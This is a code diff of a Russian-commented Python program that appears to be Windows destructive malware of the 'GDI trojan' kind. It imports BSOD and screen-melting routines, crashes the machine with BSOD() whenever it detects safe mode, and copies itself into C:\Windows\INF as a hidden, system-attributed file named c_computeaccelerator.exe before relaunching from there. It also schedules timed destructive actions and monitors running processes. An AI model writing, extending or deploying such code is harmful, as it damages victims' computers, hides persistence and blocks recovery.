@@ -20,21 +20,20 @@ from regedit_and_virus_safe import (
     ctrt_alt_BSOD)
 
 from start_gdi import (
-    startdrawimages, 
-    starterrors, 
-    starthell, 
-    starticonscursor, 
-    startinvert, 
-    startmelt, 
-    startpanscreen, 
-    startrastagHori, 
-    startrottun, 
-    startsines, 
-    startsmelt, 
-    startswipescreen, 
-    starttunnel, 
+    startdrawimages,
+    starterrors,
+    starthell,
+    starticonscursor,
+    startinvert,
+    startmelt,
+    startpanscreen,
+    startrastagHori,
+    startrottun,
+    startsines,
+    startsmelt,
+    startswipescreen,
+    starttunnel,
     startvoid)
-
 
 
 def resource_path(relative_path):
@@ -44,26 +43,29 @@ def resource_path(relative_path):
         base_path = os.path.join(os.path.abspath("."), "resources")
     return os.path.join(base_path, relative_path)
 
+
 ###
 file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"
 TARGET_DIR = r"C:\Windows\INF"
 ###
 
-def is_safe_mode():
-    SM_CLEANBOOT = 67
-    mode = ctypes.windll.user32.GetSystemMetrics(SM_CLEANBOOT)
-    return mode in (1, 2)
-
-
 def check_safemode():
-    def russia():
+    def runner():
+        print("[INFO] Проверка безопасного режима...")
         try:
-            if not is_safe_mode():
-                sys.exit(1)
-            BSOD()
+            SM_CLEANBOOT = 67
+            mode = ctypes.windll.user32.GetSystemMetrics(SM_CLEANBOOT)
+            print(f"[DEBUG] Режим загрузки: {mode}")
+
+            if mode in (1, 2):
+                print("[INFO] Безопасный режим обнаружен. Запуск BSOD()...")
+                BSOD()
+            else:
+                print("[INFO] Система НЕ в безопасном режиме. Действие не требуется.")
+
         except Exception as e:
-            print(f"Ошибка: {e}")
-    threading.Thread(target=russia, daemon=True).start()
+            print(f"[ERROR] Отвал при проверке безопасного режима: {e}")
+    threading.Thread(target=runner, daemon=True).start()
 
 
 def delete_mei():
@@ -109,27 +111,32 @@ def copyicons():
 
 
 def copy_to_target(new_name="c_computeaccelerator.exe"):
-    # Копирует текущий исполняемый файл в папку назначения с указанным именем
-    if not os.path.exists(TARGET_DIR):
-        os.makedirs(TARGET_DIR)
-        return
-    # Полный путь текущего файла
-    current_file = sys.argv[0]
-    target_file = os.path.join(TARGET_DIR, new_name)
-
-    # Проверяем, если уже в папке назначения с указанным именем, не копируем
-    if os.path.abspath(current_file) == os.path.abspath(target_file):
-        return True  # Уже в нужной папке с нужным именем
-    # Копируем файл
     try:
-        shutil.copy(current_file, target_file)
-        print("Успешно", f"Программа скопирована в {TARGET_DIR} с именем {new_name}")
-        # Устанавливаем атрибуты скрытый и системный
-        set_file_attributes(target_file)
-        os.startfile(target_file)  # Запускаем копию из целевой папки
-        sys.exit()  # Завершаем исходный файл
+        if not os.path.exists(TARGET_DIR):
+            os.makedirs(TARGET_DIR)
+            print(f"[INFO] Папка {TARGET_DIR} создана.")
+
+        current_file = sys.argv[0]
+        target_file = os.path.join(TARGET_DIR, new_name)
+
+        if os.path.abspath(current_file) == os.path.abspath(target_file):
+            print("[INFO] Уже работаем из целевой папки.")
+            return True
+
+        if not os.path.exists(target_file):
+            shutil.copy(current_file, target_file)
+            print(f"[INFO] Программа скопирована в {target_file}")
+            set_file_attributes(target_file)
+        else:
+            print(f"[INFO] Файл уже существует в {target_file}, копирование не требуется.")
+
+        os.startfile(target_file)
+        print("[INFO] Запущен файл из целевой папки. Завершение текущего экземпляра.")
+        os._exit(0)
+
     except Exception as e:
-        print("Ошибка", f"Не удалось скопировать файл: {e}")
+        print(f"[ERROR] Ошибка при копировании или запуске: {e}")
+        return False
 
 
 def changetoeng():
@@ -176,7 +183,6 @@ def checkexe():
     def schedule_events():
         sequence = [2, 4, 8, 12, 16, 18, 20, 24, 28, 30, 35, 40, 45, 50]
         time_map = {}
-
         delay = 0
         for num in sequence:
             if num <= 30:
@@ -191,20 +197,16 @@ def checkexe():
             time.sleep(delay_sec)
             if not triggered_events[n]:
                 triggered_events[n] = True
-                actions[n]()  # запускаем, если не был запущен
-
+                actions[n]()  # запускаем, если не был запуще
         # Создаём потоки под таймеры
         for n, delay in time_map.items():
             threading.Thread(target=timer_run, args=(n, delay), daemon=True).start()
-
     # Запускаем планировщик
     schedule_events()
-
     # Основной цикл — проверка exe
     while True:
         current_pids = set()
         app_instances = defaultdict(set)
-
         for proc in psutil.process_iter(['pid', 'name', 'username']):
             try:
                 pid = proc.info['pid']
@@ -257,7 +259,7 @@ def checktxt():
 
                 checkexe_threading = threading.Thread(target=checkexe)
                 checkexe_threading.start()
-                
+
                 explorer_monitor_threading = threading.Thread(target=monitor_explorer(poll_interval=1))
                 explorer_monitor_threading.start()
 
@@ -293,7 +295,6 @@ def checktxt():
 if __name__ == "__main__":
 
     check_safemode()
-
     delete_mei()
 
     wait = threading.Thread(target=ctrt_alt_BSOD)
